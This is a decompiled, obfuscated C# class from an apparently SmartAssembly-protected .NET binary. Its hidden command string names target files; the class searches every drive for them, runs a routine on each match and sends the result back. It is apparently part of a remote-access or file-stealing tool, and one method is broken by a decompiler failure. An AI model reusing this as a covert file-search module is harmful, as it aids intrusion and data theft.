using System;
using System.Collections.Generic;
using System.IO;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ns3;

namespace ns1;

internal sealed class Class7
{
	public List<string> list_0 = new List<string>();

	public bool bool_0 = false;

	public string string_0;

	public Class2 class2_0;

	public int int_0 = 0;

	public List<string> list_1 = new List<string>();

	public List<string> list_2 = new List<string>();

	public int int_1 = 0;

	[NonSerialized]
	internal static GetString getString_0;

	public Class7()
	{
		list_1.Add(getString_0(107395393).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394840).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394819).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394782).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394753).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394764).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394739).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394682).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394653).Split(new char[1] { '|' })[0]);
		list_1.Add(getString_0(107394624).Split(new char[1] { '|' })[0]);
	}

	public string method_0(string string_1)
	{
		string text = getString_0(107396667);
		if (Directory.Exists(string_1))
		{
			string[] directories = Directory.GetDirectories(string_1);
			string[] array = directories;
			foreach (string text2 in array)
			{
				if (method_4(text2))
				{
					text = text + text2 + getString_0(107396709).Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public IEnumerable<string> method_1(string string_1)
	{
		//yield-return decompiler failed: Method not found
		return new Class8(-2)
		{
			class7_0 = this,
			string_2 = string_1
		};
	}

	public void method_2(string string_1)
	{
		class2_0.bool_8 = false;
		list_0.Clear();
		list_2.Clear();
		int_1 = 0;
		int_0 = 0;
		string[] array = string_1.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		string[] array4 = array3;
		foreach (string text in array4)
		{
			if (text != getString_0(107396667))
			{
				list_0.Add(text);
			}
		}
		if (array[1] != getString_0(107396667))
		{
			bool_0 = true;
			method_3(array[1]);
			bool_0 = false;
			class2_0.method_1(null, getString_0(107395123).Split(new char[1] { '!' })[0]);
			return;
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		bool_0 = true;
		DriveInfo[] array5 = drives;
		DriveInfo[] array6 = array5;
		foreach (DriveInfo driveInfo in array6)
		{
			if (driveInfo.IsReady)
			{
				method_3(driveInfo.Name);
			}
		}
		class2_0.method_1(null, getString_0(107395086).Split(new char[1] { '!' })[0]);
		bool_0 = false;
	}

	public void method_3(string string_1)
	{
		try
		{
			foreach (string item in method_1(string_1))
			{
				int num = item.LastIndexOf(getString_0(107396472).Split(new char[1] { '!' })[0]);
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (list_0.Contains(text.ToLower()))
				{
					string text2 = class2_0.class1_0.method_0(item, bool_0: true);
					class2_0.method_1(null, getString_0(107395013).Split(new char[1] { '!' })[0] + item + getString_0(107395016).Split(new char[1] { '!' })[0] + text2);
				}
				if (class2_0.bool_8)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public bool method_4(string string_1)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string method_5(string string_1)
	{
		string text = getString_0(107396667);
		if (Directory.Exists(string_1))
		{
			string[] files = Directory.GetFiles(string_1);
			string[] array = files;
			foreach (string text2 in array)
			{
				text = text + text2 + getString_0(107396709).Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string method_6()
	{
		string text = getString_0(107396667);
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		DriveInfo[] array2 = array;
		foreach (DriveInfo driveInfo in array2)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + getString_0(107396164).Split(new char[1] { '!' })[0];
			}
		}
		return text;
	}

	static Class7()
	{
		Strings.CreateGetStringDelegate(typeof(Class7));
	}
}
